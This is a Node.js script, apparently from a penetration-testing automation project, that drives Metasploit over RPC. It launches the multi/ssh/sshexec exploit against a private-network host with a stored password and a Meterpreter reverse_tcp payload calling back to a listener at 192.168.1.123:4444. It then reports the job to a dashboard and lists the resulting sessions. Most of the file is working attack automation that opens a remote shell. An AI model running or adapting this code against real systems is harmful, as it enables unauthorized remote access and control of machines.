#!/usr/bin/env node

var amqp = require('amqplib/callback_api');
var nmap = require('node-nmap');
const axios = require('axios').default;
const axiosCookieJarSupport = require('axios-cookiejar-support').default;
const tough = require('tough-cookie');


require('dotenv').config();

axiosCookieJarSupport(axios);

const cookieJar = new tough.CookieJar();
axios.defaults.jar = cookieJar;
axios.defaults.withCredentials = true;

async function f() {
    const MsfRpc = require('msfrpc');
    const msfrpcUri = process.env.MSFRPC_STRING;
    const msfrpc = new MsfRpc(msfrpcUri);
    console.log("about to connect");
    await msfrpc.connect();
    console.log("connected, getting version");
    let version = await msfrpc.core.version();
    console.log(version);

    console.log(process.env.EXPLOIT_OPTIONS);

    let job = await msfrpc.module.execute('exploit', 'multi/ssh/sshexec', {"RHOSTS": "192.168.1.42", "USERNAME": "bj", "PASSWORD": process.env.SSH_PASS, "PAYLOAD": "linux/x86/meterpreter/reverse_tcp", "LHOST": "192.168.1.123", "LPORT": "4444"});
    console.log(job);
    
    axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
    .then(function(resp) {
        console.log(resp.status);
    })
    .catch(function(error) {
        console.log("in catch, trying to login'");
        let loginReq = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
            "email": process.env.DASHBOARD_USER,
            'password': process.env.DASHBOARD_PASS
        })
        loginReq
        .then(function(response) {
            console.log(response.status);
            console.log("login successful");
        })
        .catch(function(error) {
            console.log("logi failed");
            process.exit(1);
        });

        return loginReq
    })
    .then(function() {
        console.log("about to post job");
        axios.post(process.env.DASHBOARD_URL+'/exploit', {
            ip: "192.168.1.42",
            port: 22,
            exploit: "multi/ssh/login",
            jobID: job.uuid
        })
        .then(function(resp) {
            console.log(resp.data);

        });
    })

    let running = true;
    while(running) {
        let jobList = await msfrpc.job.list();
        for (j in jobList) {
            console.log(j);
            running = false;
            if(j === job.job_id) {
                running = true;
            }
        }

        let promise = new Promise((resolve, reject) => {
            setTimeout(() => resolve("done!"), 1000)
          });
        
        let result = await promise; // wait until the promise resolves (*)
    }
    console.log("job done!");
    /*
    let msfConsole = await msfrpc.console.create();
    console.log(msfConsole);
    let results = await msfrpc.console.read(0);
    console.log(results);

    let consoleList = await msfrpc.console.list();
    console.log(consoleList);
    */

   let promise = new Promise((resolve, reject) => {
    setTimeout(() => resolve("done!"), 2000)
   });

    let result = await promise; // wait until the promise resolves (*)

    let sessionList = await msfrpc.session.list();
    console.log(sessionList);



}

function doWebAuth() {
    const request = axios.post(process.env.DASHBOARD_URL+'/auth/login', {
        "email": process.env.DASHBOARD_USER,
        "password": process.env.DASHBOARD_PASS
    });

    request
    .then(function(response) {
        console.log(response.data);
        console.log(cookieJar);
        axios.get(process.env.DASHBOARD_URL+'/auth/permissions')
        .then(function(resp) {
            console.log(resp.data);
            return resp.data;
        })
        .catch(function(err) {
            console.log(err);
        })
    })
    .catch(function(error) {
        console.log(error);
    })

    return request;
}
  
f();